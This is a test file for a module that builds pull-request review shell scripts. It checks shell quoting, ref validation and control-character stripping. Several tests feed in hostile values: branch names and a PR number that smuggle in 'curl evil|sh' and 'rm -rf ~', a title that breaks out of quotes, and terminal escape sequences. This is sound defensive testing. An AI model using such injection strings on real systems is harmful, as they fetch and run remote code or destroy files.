import { describe, expect, test } from "bun:test";
import { buildReviewTerminalScript, shellQuote, terminalScriptFileName, terminalText } from "../src/terminal-launch";
import type { WatchItem } from "../src/types";

function prItem(overrides: Partial<WatchItem> = {}): WatchItem {
  return {
    id: "acme/api#42:pr_review_request",
    kind: "pr_review_request",
    lifecycle: "new",
    repo: "acme/api",
    repoName: "api",
    number: 42,
    title: "Add retry",
    actor: "octo",
    url: "https://ghe.example.com/acme/api/pull/42",
    createdAt: "2026-06-01T09:00:00Z",
    updatedAt: "2026-06-01T10:00:00Z",
    firstSeenAt: "",
    lastSeenAt: "",
    isDraft: false,
    labels: [],
    summary: "Add retry.",
    localPath: "/Users/dev/work/api",
    headBranch: "feature/retry",
    baseBranch: "main",
    ...overrides,
  };
}

describe("buildReviewTerminalScript", () => {
  test("fetches the PR into refs/attn/ without checking it out", () => {
    const script = buildReviewTerminalScript(prItem());
    expect(script).toContain("cd '/Users/dev/work/api'");
    expect(script).toContain(
      'git fetch origin "+refs/pull/42/head:refs/attn/pr-42" "+refs/heads/main:refs/attn/base-42"',
    );
    expect(script).toContain("git diff refs/attn/base-42...refs/attn/pr-42");
    expect(script).not.toMatch(/git (checkout|switch|worktree|pull|stash)/);
    expect(script).toContain("exec zsh");
  });

  test("never inlines unsafe author-controlled refs", () => {
    const script = buildReviewTerminalScript(prItem({ headBranch: "x$(curl evil|sh)", baseBranch: "y; rm -rf ~" }));
    expect(script).not.toContain("curl evil");
    expect(script).not.toContain("rm -rf ~");
    expect(script).toContain('"+refs/heads/main:refs/attn/base-42"');
  });

  test("shell-quotes free text like titles so quotes cannot escape", () => {
    const script = buildReviewTerminalScript(prItem({ title: "don't'; touch /tmp/pwned; '" }));
    expect(script).not.toContain("; touch /tmp/pwned; '\n");
    // The single-quote escaping keeps the payload inside the quoted echo arg.
    expect(script).toContain(shellQuote("acme/api #42: don't'; touch /tmp/pwned; '"));
  });

  // zsh's echo expands backslash escapes even inside single quotes, so a title
  // could clear the window and print fake output. CI's Linux runner lacks zsh;
  // the macOS release job runs this.
  test.skipIf(!Bun.which("zsh"))("prints a hostile title literally, with no escape sequences", () => {
    const title = "x \\e[2J\\cREST \u001b]0;pwned\u0007";
    const script = buildReviewTerminalScript(prItem({ title }));
    const header = script.split("\n").slice(2, 4).join("\n");
    const result = Bun.spawnSync(["zsh", "-f", "-c", header]);
    expect(result.stdout.toString()).toBe(
      "acme/api #42: x \\e[2J\\cREST ]0;pwned\nhttps://ghe.example.com/acme/api/pull/42\n",
    );
  });

  test("refuses non-PR items and items without a local checkout", () => {
    expect(() => buildReviewTerminalScript(prItem({ kind: "issue_assigned" }))).toThrow();
    expect(() => buildReviewTerminalScript(prItem({ localPath: undefined }))).toThrow();
  });

  test("refuses a non-integer PR number that could break out of the script", () => {
    // number is typed as a number, but it round-trips through untrusted JSON
    // (snapshot.json / github-cache.json) that is parsed and cast blindly.
    expect(() => buildReviewTerminalScript(prItem({ number: "1; curl evil|sh #" as unknown as number }))).toThrow();
    expect(() => buildReviewTerminalScript(prItem({ number: -1 }))).toThrow();
    expect(() => buildReviewTerminalScript(prItem({ number: 1.5 }))).toThrow();
  });
});

describe("terminalScriptFileName", () => {
  test("builds a filesystem-safe .command name", () => {
    expect(terminalScriptFileName(prItem())).toBe("review-api-42.command");
    expect(terminalScriptFileName(prItem({ repoName: "weird repo/name" }))).toBe("review-weird-repo-name-42.command");
  });
});

describe("terminalText", () => {
  test("removes C0, DEL, and C1 control characters and keeps other text", () => {
    expect(terminalText("a\u001b[2Jb\u0007c\u007fd\u009be\nf\tg")).toBe("a[2Jbcdefg");
    expect(terminalText("naïve 修正 \\e")).toBe("naïve 修正 \\e");
  });
});
